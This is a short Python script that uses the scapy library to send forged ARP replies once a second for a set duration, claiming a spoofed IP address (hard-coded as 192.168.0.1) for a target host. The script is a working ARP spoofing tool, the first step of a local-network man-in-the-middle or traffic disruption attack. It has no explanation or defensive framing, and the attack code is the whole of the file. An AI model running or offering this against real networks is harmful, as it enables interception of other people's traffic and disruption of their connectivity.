import time

from scapy.all import sendp
from scapy.layers.l2 import ARP, Ether


def main(
    target_ip: str, spoof_ip: str, interface: str = "eth0", duration_seconds: int = 60
) -> int:
    ethernet = Ether()
    arp = ARP(pdst=target_ip, psrc=spoof_ip, op="is-at")
    packet = ethernet / arp

    for _ in range(duration_seconds):
        sendp(packet, iface=interface)
        time.sleep(1)
    return 0


if __name__ == "__main__":
    main("8.8.8.8", "192.168.0.1", "enp2s0", 60)
